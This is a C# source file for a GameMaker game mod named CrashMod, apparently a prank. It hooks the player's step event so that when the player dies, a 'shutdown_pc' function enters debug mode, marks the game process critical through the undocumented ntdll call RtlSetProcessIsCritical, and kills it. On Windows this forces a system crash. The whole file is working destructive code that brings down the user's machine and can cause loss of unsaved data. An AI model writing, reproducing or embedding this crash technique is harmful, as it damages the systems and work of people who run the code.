using GmmlPatcher;
using GmmlInteropGenerator;
using GmmlInteropGenerator.Types;
using UndertaleModLib;
using System;
using System.Runtime.InteropServices;

namespace WYSFunny
{
    public partial class CrashMod : IGameMakerMod
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        public void Load(int audioGroup, UndertaleData data, ModData currentMod)
        {
            if (audioGroup != 0) return;

            try
            {
                data.Code.First(code => code.Name.Content == "gml_Object_obj_player_Step_0")
                    .AppendGML("if (dead == 1){shutdown_pc()}", data);
            }
            catch (Exception) { }
        }

        [GmlInterop("shutdown_pc")]
        public static string ShutdownPc(ref CInstance self, ref CInstance other)
        {
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
            return "rip pc";
        }
    }
}
